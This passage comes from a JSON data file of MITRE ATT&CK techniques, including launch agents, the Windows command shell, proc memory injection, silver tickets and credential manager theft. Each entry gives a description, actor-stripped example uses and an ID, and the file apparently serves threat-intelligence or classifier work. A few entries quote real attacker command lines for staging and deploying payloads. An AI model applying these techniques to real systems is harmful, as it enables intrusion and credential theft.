      "can use launch agents for persistence.",
      "uses a Launch Agent to persist.",
      "can achieve persistence by creating launch agents to repeatedly execute malicious payloads."
    ],
    "description": "Adversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence. When a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (.plist) file found in /System/Library/LaunchAgents, /Library/LaunchAgents, and ~/Library/LaunchAgents.(Citation: AppleDocs Launch Agent Daemons)(Citation: OSX Keydnap malware) (Citation: Antiquated Mac Malware) Property list files use the Label, ProgramArguments , and RunAtLoad keys to identify the Launch Agent's name, executable location, and execution time.(Citation: OSX.Dok Malware) Launch Agents are often installed to perform updates to programs, launch user specified programs at login, or to conduct other developer tasks. Launch Agents can also be executed using the [Launchctl](https://attack.mitre.org/techniques/T1569/001) command. Adversaries may install a new Launch Agent that executes at login by placing a .plist file into the appropriate folders with the RunAtLoad or KeepAlive keys set to true.(Citation: Sofacy Komplex Trojan)(Citation: Methods of Mac Malware Persistence) The Launch Agent name may be disguised by using a name from the related operating system or benign software. Launch Agents are created with user level privileges and execute with user level permissions.(Citation: OSX Malware Detection)(Citation: OceanLotus for OS X) ",
    "similar_words": [
      "Launch Agent"
    ],
    "id": "T1543.001"
  },
  "attack-pattern--d157f9d2-d09a-4efa-bb2a-64963f94e253": {
    "name": "System Services",
    "example_uses": [
      "has created system services to execute cryptocurrency mining software."
    ],
    "description": "Adversaries may abuse system services or daemons to execute commands or programs. Adversaries can execute malicious content by interacting with or creating services either locally or remotely. Many services are set to run at boot, which can aid in achieving persistence ([Create or Modify System Process](https://attack.mitre.org/techniques/T1543)), but adversaries can also abuse services for one-time or temporary execution.",
    "similar_words": [
      "System Services"
    ],
    "id": "T1569"
  },
  "attack-pattern--d1fcf083-a721-4223-aedf-bf8960798d62": {
    "name": "Windows Command Shell",
    "example_uses": [
      "is capable of executing commands.",
      "malware uses cmd.exe to execute commands on a compromised host. A Destover-like variant used by  uses a batch file mechanism to delete its binaries from the system.",
      "launches a shell to execute commands on the victims machine.",
      "can execute shell commands.",
      "A module in  allows arbitrary commands to be executed by invoking C:\\Windows\\System32\\cmd.exe.",
      "has used `cmd.exe` to scan a compromised host for specific file extensions.",
      "can execute shell commands.  can execute commands with JavaScript.",
      "can download and run batch files to execute commands on a compromised host.",
      "has used `cmd` to execute commands on a compromised host.",
      "has a command to open the command-line on the infected system.",
      "can execute arbitrary commands and utilize the ComSpec environment variable.",
      "uses cmd.exe to set the Registry Run key value. It also has a command to spawn a command shell.",
      "can create a reverse shell on the infected endpoint using cmd.exe.  has been executed via malicious macros.",
      "can execute commands via the command line shell.",
      "has used cmd.exe to run its self deletion routine.",
      "During  threat actors spawned a new `cmd.exe` process to execute commands.",
      "has a command to run cmd.exe to execute commands.",
      "can use cmd.exe to launch itself and to execute multiple C2 commands.",
      "can use `cmd.exe` for execution on compromised hosts.",
      "can open a remote command-line interface and execute commands.  uses JavaScript files.",
      "Several tools used by  have been command-line driven.",
      "used the Windows command shell to execute commands.",
      "can use `cmd.exe` for execution on victim systems.",
      "has executed commands via cmd.exe.",
      "uses cmd.exe to create a reverse shell on the infected endpoint.",
      "has used the command-line interface for code execution.",
      "has called cmd through a Word document macro.",
      "has the ability to execute shell commands on the infected host.",
      "server component is capable of opening a command terminal.",
      "has used a tool to open a Windows Command Shell on a remote host.",
      "has used macros in Word documents that would download a second stage if executed.",
      "has used SQL to execute JavaScript and VB scripts on the host system.",
      "can execute commands using `cmd.exe`.",
      "can execute shell commands using `cmd.exe`.",
      "has used `cmd.exe` to execute commands on a victim's machine.",
      "uses the command line and rundll32.exe to execute.",
      "can use the Windows command line to delete volume shadow copies and disable recovery.",
      "can use the command-line utility cacls.exe to change file permissions.",
      "can execute shell commands against .",
      "backdoor has used cmd.exe to execute arbitrary commands as well as batch scripts to update itself to a newer version.",
      "can use `cmd.exe` to drop and run files.",
      "can use `cmd.exe` to execute commands on a victim's system.",
      "can execute commands.",
      "can run cmd.exe with parameters.",
      "can copy cmd.exe into the system temp folder.",
      "has the ability to execute shell commands on the compromised host.",
      "can execute arbitrary shell commands on the victims' machines.",
      "can use the Windows Command Shell to execute commands including its own removal.",
      "has used the Windows command line to perform hands-on-keyboard activities in targeted environments including for discovery.",
      "executes BAT scripts.",
      "has used macros to deliver malware such as  and .  has used batch scripts.",
      "has used command-line interfaces for execution.",
      "can launch cmd.exe to perform reconnaissance commands.",
      "can use cmd.exe for execution.",
      "can execute shell commands using cmd.exe.",
      "actors spawned shells on remote systems on a victim network to execute commands.",
      "has command line access.",
      "has the capability to create a remote shell and execute specified commands.",
      "uses cmd.exe to execute commands on the victims machine.",
      "can use native command line for execution.",
      "provides access using both standard facilities like SSH and additional access using its backdoor Espeon providing a reverse shell upon receipt of a special packet",
      "has used `cmd.exe` for archiving data and deleting files.",
      "uses cmd.exe to execute commands on the victims machine.",
      "can execute commands using cmd.exe.",
      "can read batch commands in a file sent from its C2 server and execute them with cmd.exe.",
      "can execute arbitrary commands with the command line.",
      "has the ability to execute command line arguments on a compromised host.",
      "can execute shell commands using `cmd.exe`.",
      "has been used to execute remote commands.",
      "executes the cmd.exe command.",
      "is capable of spawning a Windows command shell.",
      "uses cmd.exe to execute commands.",
      "uses custom batch scripts to execute some of its components.",
      "has the ability to use `CMD` to execute commands.",
      "has executed commands using cmd.exe /c.",
      "has used cmd.exe for execution.",
      "used cmd.exe /c within a malicious macro.",
      "has used batch scripts to download tools and executing cryptocurrency miners.",
      "has used `cmd.exe` for execution.",
      "is capable of spawning a reverse shell on a victim.",
      "has used cmd.exe to add a persistent service.",
      "has used batch files to initiate additional downloads of malicious files.",
      "has used cmd.exe and batch scripts to execute commands.",
      "During  threat actors used  to establish full remote control of the connected machine and run command-line shells.",
      "has used a command-line tunneler NACHOCHEESE to give them shell access to a victims machine.",
      "has used a custom tool for creating reverse shells.",
      "provides command-line access to the compromised system.",
      "can start a command shell.",
      "can execute commands via the command line utility.",
      "may abuse the Windows schtasks command-line tool to create hidden scheduled tasks.",
      "Adversaries can direct  to execute from the command line on infected hosts or have  create a reverse shell.",
      "can use `cmd.exe` to add registry keys for persistence.",
      "has used `cmd.exe` to execute commands on the victim's machine.",
      "has used batch scripts to delete itself after execution.",
      "can use `cmd.exe` to execute a created batch file.",
      "has used `cmd.exe` to run commands on a compromised host.",
      "has the capability to create a reverse shell.",
      "An  downloader uses the Windows command cmd.exe /C whoami. The group also uses a tool to execute commands on remote computers.",
      "creates a command-line shell using cmd.exe.",
      "has the capability to create a remote shell.",
      "has the ability to execute commands through  on a compromised host.",
      "can execute `cmd` commands on a compromised host.",
      "can open a command line to execute commands.",
      "has used cmd.exe for execution.",
      "silently executes received commands with cmd.exe.",
      "uses a batch file to kill a security program task and then attempts to remove itself.",
      "kills and disables services by using cmd.exe.",
      "has executed malicious .bat files containing PowerShell commands.",
      "can launch a console process (cmd.exe) with redirected standard input and output.",
      "can utilize cmd.exe to execute commands in a victim's environment.",
      "has the ability to execute shell commands.",
      "has used cmd.exe /c and batch files for execution.",
      "malware can use cmd.exe to download and execute payloads and to execute commands on the system.",
      "has used kill.bat script to disable security tools.",
      "has used `cmd.exe` and `.bat` scripts for execution.",
      "can use cmd.exe to run commands.",
      "has the ability to use the command line for execution on the targeted system.",
      "can launch a remote command shell interface for executing commands.",
      "has a command to create a reverse shell.",
      "has used cmd.exe likely as a password changing mechanism.",
      "has used batch script files to automate execution and deployment of payloads.",
      "can open a reverse shell on the system to execute commands.",
      "can execute shell commands on a compromised host.",
      "An  loader Trojan uses a cmd.exe and batch script to run its payload. The group has also used macros to execute payloads.",
      "has used cmd.exe to create a Registry entry to establish persistence.",
      "has been installed using a .bat file.",
      "has the ability to set a Registry key to run a cmd.exe command.",
      "uses the command-line interface.",
      "has provided the ability to execute shell commands on a compromised host.",
      "creates a backdoor through which remote attackers can open a command line interface.",
      "has executed Windows commands by using `cmd` and running batch scripts.",
      "Operators deploying  have used batch scripts to retrieve the  payload.",
      "has used the Windows command line to execute commands.",
      "can run commands on the compromised asset with CMD functions.",
      "has used `cmd.exe` and batch files for execution.",
      "can use `cmd.exe` to execute commands received from C2.",
      "has used cmd /c commands embedded within batch scripts.",
      "executes from the Windows command line and can take various arguments for execution.",
      "has the ability to create a remote shell and run given commands.",
      "can execute commands via an interactive command shell.  uses batch scripts for various purposes including to restart and uninstall itself.",
      "has executed HTA files via cmd.exe and used batch scripts for collection.",
      "can spawn remote shells.",
      "During the   used the `xp_cmdshell` command in MS-SQL.",
      "can use  to execute commands on a victims machine.",
      "can launch cmd.exe to execute commands on the system.",
      "can create a remote shell and run a given command.",
      "has used Windows command scripts.",
      "can execute commands on victims.",
      "has used  to execute commands on the system.",
      "is capable of creating a reverse shell.",
      "creates a backdoor through which remote attackers can start a remote shell.",
      "allows actors to spawn a reverse shell on a victim.",
      "can use `cmd.exe` for execution.",
      "has the ability to use  to run a Portable Executable (PE) on the compromised host.",
      "can execute remote commands via the command-line interface.",
      "has the ability to use cmd.exe to execute commands passed from an Outlook C2 channel.",
      "uses the command prompt to execute commands on the victim's machine.",
      "has the ability to run commands on a compromised host.",
      "uses cmd.exe to execute scripts and commands on the victims machine.",
      "used cmd.exe /c to execute commands on remote machines. used a batch file to install persistence for the  BEACON loader.",
      "has the ability to use the command line to control execution on compromised hosts.",
      "During  various implants used batch scripting and `cmd.exe` for execution.",
      "can be issued a command shell function from the C2.",
      "allows adversaries to execute shell commands on the infected host.",
      "has the ability to run `cmd.exe` or other interactive processes on a compromised computer.",
      "can use `cmd.exe` to enable shadow copy deletion.",
      "uses cmd.exe to execute netshcommands.",
      "can open an interactive command-shell to perform command line functions on victim machines.  performs most of its operations using Windows Script Host (Jscript) and to run arbitrary shellcode.",
      "can enable Windows CLI access and execute files.",
      "can use `cmd.exe /Q/c move CSIDL_SYSTEM_DRIVE\\temp\\sys.tmp1 CSIDL_WINDOWS\\policydefinitions\\postgresql.exe 1> \\\\127.0.0.1\\ADMIN$\\_1636727589.6007507 2>&1` to deploy on an infected system.",
      "During  the threat actors used `cmd.exe` to execute the wmiexec.vbs script.",
      "can use cmd.exe for command execution.",
      "During  the threat actors ran a command script to set up persistence as a scheduled task named WinUpdate as well as other encoded commands from the command-line",
      "has used batch scripts on victim's machines.",
      "uses Windows Script Components.",
      "can use `cmd.exe` to execute commands.",
      "has attempted and failed to run Bash commands on a Windows host by passing them to cmd /C.",
      "has an integrated scripting engine to download and execute Lua scripts.",
      "has leveraged `xp_cmdshell` and Windows Command Shell to execute commands on a compromised machine.  has also attempted to leverage the xp_cmdshell SQL procedure to execute remote commands on internal MS-SQL servers.",
      "can use cmd.exe to execute malicious files on compromised hosts.",
      "uses a .bat file to execute a .dll.",
      "can execute various Windows commands.",
      "can launch a remote command line to execute commands on the victims machine.",
      "can execute command line scripts received from C2.",
      "can receive and execute commands with cmd.exe. It can also provide a reverse shell.",
      "is capable of executing commands via cmd.exe.",
      "can launch a remote shell to execute commands.",
      "can use `cmd.exe` for discovery actions on a targeted system.",
      "can launch a remote shell to execute commands on the victims machine.",
      "creates a backdoor through which remote attackers can open a command-line interface.",
      "can use the Windows Command Shell for execution.",
      "has used cmd.exe to execute commands.",
      "can spawn a command shell and execute native commands.",
      "RPC backdoors have used cmd.exe to execute commands.",
      "has the ability to execute shell commands.",
      "can remotely open applications on the infected host with the ShellExecuteA command.",
      "has used .cmd scripts on the victim's system.",
      "can run cmd through an IRC channel.",
      "can run `cmd /c copy /y /b C:\\Users\\public\\syslog_6-*.dat C:\\Users\\public\\syslog.dll` to combine separated sections of code into a single DLL prior to execution.",
      "has used the Windows Command Shell and batch scripts for execution on compromised hosts.",
      "uses cmd.exe to execute itself in-memory.",
      "can execute commands on the victim's machine.",
      "has used command line during its intrusions.",
      "has used macros in Excel documents to download and deploy the malware on the users machine.",
      "has used a JavaScript backdoor that is capable of launching cmd.exe to execute shell commands. The group has used an exploit toolkit known as Threadkit that launches .bat files.",
      "can use cmd.exe to help execute commands on the system.",
      "leverages cmd.exe to perform discovery techniques.  loads malicious shellcode and executes it in memory.",
      "has used .bat scripts and `cmd` for execution on compromised hosts.",
      "is capable of executing commands via cmd.exe.",
      "uses a script to automate tasks on the victim's machine and to assist in execution.",
      "can launch a reverse command shell.",
      "can use a renamed image of `cmd.exe` for execution.",
      "calls cmd.exe to run various DLL files via rundll32 and also to perform file cleanup.  also has the capability to invoke a reverse shell.",
      "During the   used `cmd.exe` to execute commands on remote machines.",
      "makes modifications to open-source scripts from GitHub and executes them on the victims machine.",
      "has used `cmd` for execution on an infected host.",
      "During   used `cmd.exe` to execute reconnaissance commands.",
      "The  encryption process has used batch scripts with various commands.",
      "has the ability to execute arbitrary commands via `cmd.exe`.",
      "can execute commands from its C2 server.",
      "has the ability to create a reverse shell.",
      "can use `cmd.exe` to execute commands.",
      "has modules for executing scripts.",
      "The C# implementation of the  command execution module can use cmd.",
      "can provide a remote shell. One version of  uses batch scripting.",
      "can issue commands using cmd.exe.",
      "opens cmd.exe on the victim.",
      "has used cmd.exe to execute arbitrary commands on the infected host across different stages of the infection chain.",
      "uses cmd.exe to execute commands and run scripts on the victim's machine.",
      "can launch a remote shell to execute commands on the victims machine.",
      "has used cmd.exe to launch PowerShell.",
      "During  the threat actors used batch scripts to perform reconnaissance.",
      "has created a cmd.exe reverse shell executed commands and uploaded output via the command line.",
      "can open an interactive command shell.",
      "is capable of providing shell functionality to the attacker to execute commands.",
      "executes commands remotely on the infected host.",
      "During  the threat actors used `cmd.exe` to execute commands and run malicious binaries.",
      "uses cmd.exe to execute commands on the system.",
      "has a command to launch a remote shell and executes commands on the victims machine.",
      "has used various types of scripting to perform operations including batch scripts.",
      "executes cmd.exe to provide a reverse shell to adversaries.",
      "has used batch files to deploy open-source and multi-stage RATs.",
      "has a command to start an interactive shell.",
      "uses cmd.exe to execute commands for discovery.",
      "has used cmd.exe for execution on compromised systems.",
      "can issue shell commands to download and execute additional payloads.",
      "can use CMD to execute a process.",
      "has executed commands using `cmd.exe /c <command> > <%temp%>\\AM<random>. tmp 2>&1`.",
      "has used  to execute tasks on the system.",
      "executes a bash script to establish a reverse shell.",
      "has dropped an mspaint.lnk shortcut to disk which launches a shell script that downloads and executes a file.",
      "executes cmd.exe and uses a pipe to read the results and send back the output to the C2 server.",
      "ran a reverse shell with Meterpreter.  used JavaScript code and .SCT files on victim machines.",
      "has the capability to execute commands using cmd.exe.",
      "has used cmd.exe /c to execute files.",
      "can run `set.bat` `update.bat` `cache.bat` `bcd.bat` `msrun.bat` and similar scripts.",
      "uses the command-line interface to execute arbitrary commands.",
      "has used cmd.exe to run a PowerShell script.",
      "has launched cmd.exe and used the ShellExecuteW() API function to execute commands on the system.",
      "can use `cmd.exe` to execute commands on a compromised host.",
      "has used the command-line interface.",
      "has the ability to execute commands with the COMSPEC environment variable.",
      "can launch an interface where it can execute several commands on the victims PC.",
      "used the command prompt to launch commands on the victims machine.",
      "can use `cmd.exe` to run various commands as a reverse shell.",
      "can use `cmd.exe` to execute malicious code.",
      "has used batch scripts in its malware to install persistence mechanisms.",
      "provides a reverse shell on the victim.",
      "can use `cmd.exe` to enable lateral movement using DCOM.",
      "has the ability to execute commands via `cmd.exe`.",
      "can use a batch script to delete itself.",
      "has used batch scripts and the command-line interface for execution.",
      "had used `cmd.exe` and Windows Script Host (wscript) to execute malicious code.",
      "can create a remote shell and execute commands using .",
      "can run a copy of cmd.exe.",
      "can use a remote command module for execution via the Windows command line.",
      "used cmd.exe for execution.",
      "can launch command-line shells.",
      "can uninstall malware components using a batch script.  can execute commands using a shell.",
      "executes commands using a command-line interface and reverse shell. The group has used a modified version of pentesting script wmiexec.vbs to execute commands.  has used malicious macros embedded inside Office documents to execute files.",
      "can perform reconnaissance commands on a victim machine via a cmd.exe process.",
      "executes a binary on the system and logs the results into a temp file by using: cmd.exe /c <file_path> > %temp%\\PM* .tmp 2>&1.",
      "has used a Batch file to automate frequently executed post compromise cleanup activities.  has also executed commands remotely via `cmd.exe`.",
      "can use `cmd.exe` to execute plugins and to send command output to specified SMB shares.",
      "is capable of executing commands and spawning a reverse shell.",
      "During   launched malicious DLL files created new folders and renamed folders with the use of the Windows command shell.",
      "has used `cmd.exe` for execution.",
      "used a batch script to run the Linux virtual machine as a service.",
      "uses cmd.exe to execute commands on the victims machine.",
      "runs cmd.exe /c and sends the output to its C2.",
      "can launch interactive shells for communicating with the victim machine.",
      "has used batch files for execution and can launch Internet Explorer from cmd.exe.",
      "has used cmd.exe to execute commands.",
      "uses cmd.exe on the victim's computer.",
      "can execute commands on a compromised network with the use of `cmd.exe`.",
      "can utilize command line options to allow an attacker control over how it scans and encrypts files.",
      "executes batch scripts on the victims machine and can launch a reverse shell for command execution.",
      "has used cmd.exe to execute commmands.",
      "has used the Windows command shell to execute commands and batch scripting to automate execution.",
      "uses cmd.exe to execute commands on the victims machine.",
      "can use `cmd.exe` for execution on remote hosts.",
      "is capable of executing commands via .",
      "is capable of creating reverse shell.",
      "has the ability to use  to run a Portable Executable (PE) on the compromised host.",
      "uses the command line.",
      "has the ability to use the command shell to execute commands on a compromised host.",
      "spawns a CMD process to execute commands.",
      "has used Windows command-line to run commands.",
      "is capable of creating a reverse shell.",
      "has a command to launch a command shell on the system.",
      "has used various batch scripts to establish C2 and download additional files. 's backdoor malware has also been written to a batch file.",
      "has executed ransomware using batch scripts deployed via GPO.",
      "has the capability to open a remote shell and run basic commands.",
      "can launch a remote shell to execute arbitrary commands on the victims machine.",
      "has the ability to remotely execute commands.",
      "can launch a command shell interface for executing commands.",
      "is used to execute programs and other actions at the command-line interface.",
      "can use `cmd.exe` for execution on compromised hosts.",
      "Following exploitation with  malware  actors created a file containing a list of commands to be executed on the compromised computer.",
      "uses a command-line interface.",
      "uses a command-line interface to interact with systems.",
      "has used cmd.exe to execute commands.",
      "uses cmd.exe to execute commands on the victims machine.",
      "supports execution from the command-line.",
      "uses command line for execution.",
      "can use `cmd.exe` to execute commands on an infected host.",
      "has executed commands using cmd.exe.",
      "uses a malicious Windows Batch script to run the Windows code utility to retrieve follow-on script payloads.",
      "can run shell commands using a BAT file with a name matching `%TEMP%\\<random_9_alnum_chars>.batfile` or through cmd.exe with the `/c` and `/U` option for Unicode output.",
      "The  command handler can use `cmdexe` to run multiple discovery commands.",
      "can execute Windows shell commands via cmd.exe.",
      "installation via JavaScript will launch follow-on commands via cmd.exe.",
      "initial loaders will also drop a malicious Windows batch file available via open source GitHub repositories that disables Microsoft Defender functionality.",
      "has used a batch script to remove indicators of its presence on compromised hosts.",
      "has used `cmd.exe` to launch malicious payloads.",
      "has used the Windows Command Prompt to execute commands.",
      "can execute arbitrary commands passed to it from the C2 controller via `cmd.exe /c`.",
      "provides access to a Command Shell in Windows environments for follow-on command execution and tasking.",
      "creates a cmd.exe shell to send and receive commands from the command and control server via open pipes.",
      "uses cmd.exe to read and execute a file stored on an infected USB device as part of initial installation.",
      "can run arbitrary commands passed to it through cmd.exe.",
      "uses  web shells to enable follow-on command execution via cmd.exe.",
      "During  threat actors used Windows batch files for persistence and execution.",
      "uses a batch script launched via a scheduled task to delete Windows Event Logs.",
      "has used BAT files in malware execution chains.",
      "can execute commands via `cmd.exe`.",
      "distributed Windows batch scripts disguised as virus scanners to prompt download of malicious payloads using built-in system tools.",
      "can open cmd.exe to enable command execution.",
      "can execute multiple commands post infection via `cmd.exe`.",
      "has used `cmd.exe` to run the `curl` command.",
      "During   used cmd.exe for execution.",
      "can use the Windows command shell for multiple post-compromise actions on objective.",
      "can use `cmd.exe` to execute multiple commands on infected hosts.",
      "can execute a specified command line passed via API.",
      "has used a command-line tunneler NACHOCHEESE to give them shell access to a victims machine. Additionally  has used batch scripts.",
      "allows for arbitrary Windows command execution.",
      "allows for the execution of arbitrary commands on the victim system.",
      "has used multiple batch scripts during initial access and subsequent actions on victim machines.",
      "executed ransomware using the Windows command shell.",
      "can create and execute Windows batch scripts.",
      "can call cmd.exe to execute C2 command line strings.",
      "has the ability to execute shell commands and exfiltrate the results.",
      "has included BAT files in some instances for installation.",
      "can execute various `cmd.exe /c %s` commands.",
      "uses a malicious Windows Batch script to run the Windows code utility to retrieve follow-on script payloads.  has also used `cmd.exe` to create a remote shell."
    ],
    "description": "Adversaries may abuse the Windows command shell for execution. The Windows command shell ([cmd](https://attack.mitre.org/software/S0106)) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [SSH](https://attack.mitre.org/techniques/T1021/004).(Citation: SSH in Windows)Batch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.Adversaries may leverage [cmd](https://attack.mitre.org/software/S0106) to execute various commands and payloads. Common uses include [cmd](https://attack.mitre.org/software/S0106) to execute a single command, or abusing [cmd](https://attack.mitre.org/software/S0106) interactively with input and output forwarded over a command and control channel.",
    "similar_words": [
      "Windows Command Shell"
    ],
    "id": "T1059.003"
  },
  "attack-pattern--d201d4cc-214d-4a74-a1ba-b3fa09fd4591": {
    "name": "Proc Memory",
    "example_uses": [
      "final payload installation includes mounting and binding to the \\/proc\\/ filepath on the victim system to enable subsequent operation in memory while also removing on-disk artifacts."
    ],
    "description": "Adversaries may inject malicious code into processes via the /proc filesystem in order to evade process-based defenses as well as possibly elevate privileges. Proc memory injection is a method of executing arbitrary code in the address space of a separate live process. Proc memory injection involves enumerating the memory of a process via the /proc filesystem (/proc/[pid]) then crafting a return-oriented programming (ROP) payload with available gadgets/instructions. Each running process has its own directory, which includes memory mappings. Proc memory injection is commonly performed by overwriting the target processes stack using memory mappings provided by the /proc filesystem. This information can be used to enumerate offsets (including the stack) and gadgets (or instructions within the program that can be used to build a malicious payload) otherwise hidden by process memory protections such as address space layout randomization (ASLR). Once enumerated, the target processes memory map within /proc/[pid]/maps can be overwritten using dd.(Citation: Uninformed Needle)(Citation: GDS Linux Injection)(Citation: DD Man) Other techniques such as [Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006) may be used to populate a target process with more available gadgets. Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012), proc memory injection may target child processes (such as a backgrounded copy of sleep).(Citation: GDS Linux Injection) Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via proc memory injection may also evade detection from security products since the execution is masked under a legitimate process. ",
    "similar_words": [
      "Proc Memory"
    ],
    "id": "T1055.009"
  },
  "attack-pattern--d21bb61f-08ad-4dc1-b001-81ca6cb79954": {
    "name": "Acquire Access",
    "example_uses": [],
    "description": "Adversaries may purchase or otherwise acquire an existing access to a target system or network. A variety of online services and initial access broker networks are available to sell access to previously compromised systems.(Citation: Microsoft Ransomware as a Service)(Citation: CrowdStrike Access Brokers)(Citation: Krebs Access Brokers Fortune 500) In some cases, adversary groups may form partnerships to share compromised systems with each other.(Citation: CISA Karakurt 2022)Footholds to compromised systems may take a variety of forms, such as access to planted backdoors (e.g., [Web Shell](https://attack.mitre.org/techniques/T1505/003)) or established access via [External Remote Services](https://attack.mitre.org/techniques/T1133). In some cases, access brokers will implant compromised systems with a load that can be used to install additional malware for paying customers.(Citation: Microsoft Ransomware as a Service)By leveraging existing access broker networks rather than developing or obtaining their own initial access capabilities, an adversary can potentially reduce the resources required to gain a foothold on a target network and focus their efforts on later stages of compromise. Adversaries may prioritize acquiring access to systems that have been determined to lack security monitoring or that have high privileges, or systems that belong to organizations in a particular sector.(Citation: Microsoft Ransomware as a Service)(Citation: CrowdStrike Access Brokers)In some cases, purchasing access to an organization in sectors such as IT contracting, software development, or telecommunications may allow an adversary to compromise additional victims via a [Trusted Relationship](https://attack.mitre.org/techniques/T1199), [Multi-Factor Authentication Interception](https://attack.mitre.org/techniques/T1111), or even [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195).**Note:** while this technique is distinct from other behaviors such as [Purchase Technical Data](https://attack.mitre.org/techniques/T1597/002) and [Credentials](https://attack.mitre.org/techniques/T1589/001), they may often be used in conjunction (especially where the acquired foothold requires [Valid Accounts](https://attack.mitre.org/techniques/T1078)).",
    "similar_words": [
      "Acquire Access"
    ],
    "id": "T1650"
  },
  "attack-pattern--d245808a-7086-4310-984a-a84aaaa43f8f": {
    "name": "Patch System Image",
    "example_uses": [
      "is malware that is inserted into a network device by patching the operating system image."
    ],
    "description": "Adversaries may modify the operating system of a network device to introduce new capabilities or weaken existing defenses.(Citation: Killing the myth of Cisco IOS rootkits) (Citation: Killing IOS diversity myth) (Citation: Cisco IOS Shellcode) (Citation: Cisco IOS Forensics Developments) (Citation: Juniper Netscreen of the Dead) Some network devices are built with a monolithic architecture, where the entire operating system and most of the functionality of the device is contained within a single file.  Adversaries may change this file in storage, to be loaded in a future boot, or in memory during runtime.To change the operating system in storage, the adversary will typically use the standard procedures available to device operators. This may involve downloading a new file via typical protocols used on network devices, such as TFTP, FTP, SCP, or a console connection.  The original file may be overwritten, or a new file may be written alongside of it and the device reconfigured to boot to the compromised image.To change the operating system in memory, the adversary typically can use one of two methods. In the first, the adversary would make use of native debug commands in the original, unaltered running operating system that allow them to directly modify the relevant memory addresses containing the running operating system.  This method typically requires administrative level access to the device.In the second method for changing the operating system in memory, the adversary would make use of the boot loader. The boot loader is the first piece of software that loads when the device starts that, in turn, will launch the operating system.  Adversaries may use malicious code previously implanted in the boot loader, such as through the [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) method, to directly manipulate running operating system code in memory.  This malicious code in the bootloader provides the capability of direct memory manipulation to the adversary, allowing them to patch the live operating system during runtime.By modifying the instructions stored in the system image file, adversaries may either weaken existing defenses or provision new capabilities that the device did not have before. Examples of existing defenses that can be impeded include encryption, via [Weaken Encryption](https://attack.mitre.org/techniques/T1600), authentication, via [Network Device Authentication](https://attack.mitre.org/techniques/T1556/004), and perimeter defenses, via [Network Boundary Bridging](https://attack.mitre.org/techniques/T1599).  Adding new capabilities for the adversarys purpose include [Keylogging](https://attack.mitre.org/techniques/T1056/001), [Multi-hop Proxy](https://attack.mitre.org/techniques/T1090/003), and [Port Knocking](https://attack.mitre.org/techniques/T1205/001).Adversaries may also compromise existing commands in the operating system to produce false output to mislead defenders.   When this method is used in conjunction with [Downgrade System Image](https://attack.mitre.org/techniques/T1601/002), one example of a compromised system command may include changing the output of the command that shows the version of the currently running operating system.  By patching the operating system, the adversary can change this command to instead display the original, higher revision number that they replaced through the system downgrade. When the operating system is patched in storage, this can be achieved in either the resident storage (typically a form of flash memory, which is non-volatile) or via [TFTP Boot](https://attack.mitre.org/techniques/T1542/005). When the technique is performed on the running operating system in memory and not on the stored copy, this technique will not survive across reboots.  However, live memory modification of the operating system can be combined with [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) to achieve persistence. ",
    "similar_words": [
      "Patch System Image"
    ],
    "id": "T1601.001"
  },
  "attack-pattern--d273434a-448e-4598-8e14-607f4a0d5e27": {
    "name": "Silver Ticket",
    "example_uses": [
      "can create silver tickets.",
      "can be used to forge Kerberos tickets using the password hash of the AZUREADSSOACC account.",
      "kerberos module can create silver tickets.",
      "can leverage its implementation of  to obtain and use silver tickets."
    ],
    "description": "Adversaries who have the password hash of a target service account (e.g. SharePoint, MSSQL) may forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets. Kerberos TGS tickets are also known as service tickets.(Citation: ADSecurity Silver Tickets)Silver tickets are more limited in scope in than golden tickets in that they only enable adversaries to access a particular resource (e.g. MSSQL) and the system that hosts the resource; however, unlike golden tickets, adversaries with the ability to forge silver tickets are able to create TGS tickets without interacting with the Key Distribution Center (KDC), potentially making detection more difficult.(Citation: ADSecurity Detecting Forged Tickets)Password hashes for target services may be obtained using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) or [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).",
    "similar_words": [
      "Silver Ticket"
    ],
    "id": "T1558.002"
  },
  "attack-pattern--d2c4e5ea-dbdf-4113-805a-b1e2a337fb33": {
    "name": "Clear Persistence",
    "example_uses": [
      "removed IFEO registry values to clean up traces of persistence.",
      "has the ability to remove set Registry Keys including those used for persistence.",
      "loader can delete scheduled tasks created by a previous instance of the malware.",
      "can uninstall the malicious service from an infected machine.",
      "is capable of deleting Registry keys used for persistence.",
      "has deleted accounts it has created.",
      "is capable of manipulating and deleting registry keys including those used for persistence.",
      "can delete created registry keys used for persistence as part of its cleanup procedure.",
      "can delete previously created tasks on a compromised host.",
      "has the ability to remove Registry entries that it created for persistence.",
      "can delete various service traces related to persistent execution when commanded.",
      "uses a RunOnce Registry key for persistence where the key is removed after its use on reboot then re-added by the malware after it resumes execution.",
      "will clear registry values used for persistent configuration storage when uninstalled."
    ],
    "description": "Adversaries may clear artifacts associated with previously established persistence on a host system to remove evidence of their activity. This may involve various actions, such as removing services, deleting executables, [Modify Registry](https://attack.mitre.org/techniques/T1112), [Plist File Modification](https://attack.mitre.org/techniques/T1647), or other methods of cleanup to prevent defenders from collecting evidence of their persistent presence.(Citation: Cylance Dust Storm) Adversaries may also delete accounts previously created to maintain persistence (i.e. [Create Account](https://attack.mitre.org/techniques/T1136)).(Citation: Talos - Cisco Attack 2022)In some instances, artifacts of persistence may also be removed once an adversarys persistence is executed in order to prevent errors with the new instance of the malware.(Citation: NCC Group Team9 June 2020)",
    "similar_words": [
      "Clear Persistence"
    ],
    "id": "T1070.009"
  },
  "attack-pattern--d336b553-5da9-46ca-98a8-0b23f49fb447": {
    "name": "Windows Credential Manager",
    "example_uses": [
      "has used credential dumping tool named VALUEVAULT to steal credentials from the Windows Credential Manager.",
      "malware gathers passwords from the Windows Credential Vault.",
